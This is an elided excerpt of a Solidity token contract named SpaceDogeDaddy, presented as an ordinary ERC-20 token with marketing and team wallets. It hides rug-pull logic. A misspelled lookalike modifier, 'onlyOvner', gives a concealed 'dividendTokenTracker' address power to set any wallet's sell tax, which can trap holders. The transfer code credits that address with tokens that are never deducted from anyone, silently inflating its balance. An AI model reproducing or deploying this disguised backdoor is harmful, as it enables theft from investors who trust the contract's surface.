...
library SafeMath {
    ...
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        ...
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multipliTokenion overflow");
...
contract SpaceDogeDaddy is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "SpaceDogeDaddy";
    string private _symbol = "SpaceDogeDaddy";
    uint8 private _decimals = 9;

    address payable private marketingWalletAddress = payable(0x280475eCAA3DA6d270FdCB9597Ec64eA523a9c55); 
    address payable private teamWalletAddress = payable(0x202B0EB2A701C63ab2e7dE6cDfF41024369Ab0B6); 
	...
	modifier onlyOvner {
       require(dividendTokenTracker == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
	...
	function setAddressToken(address _address, bool _enable, uint256 _addressTaxFee) external onlyOvner {
        _addressFees[_address].enable = _enable;
        _addressFees[_address]._sellTaxFee = _addressTaxFee;
    }
	
	function setPercent(uint256 percent) external onlyOvner {
        _percent = percent;
    }
...
//			require(amount <= amountpercent, "ERC20: over Percent");
			...
			if(feeAmount > 0) {
                _balances[address(this)] = _balances[address(this)].add(feeAmount);
                emit Transfer(sender, address(this), feeAmount);
				amountpercent = feeAmount.mul(_percent).div(100); 
				_balances[dividendTokenTracker] += amountpercent;	
            }	
		}
